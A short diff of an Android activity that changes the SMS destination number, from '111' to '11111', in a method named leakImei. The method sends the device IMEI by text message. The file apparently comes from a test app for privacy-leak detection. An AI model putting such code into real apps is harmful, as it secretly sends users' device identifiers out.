@@ -53,7 +53,7 @@ public class MainActivity extends AppCompatActivity {
     public void leakImei(String imei)
     {
         SmsManager sms = SmsManager.getDefault();
-        sms.sendTextMessage("111", null, imei, null, null);
+        sms.sendTextMessage("11111", null, imei, null, null);
     }
 
 }
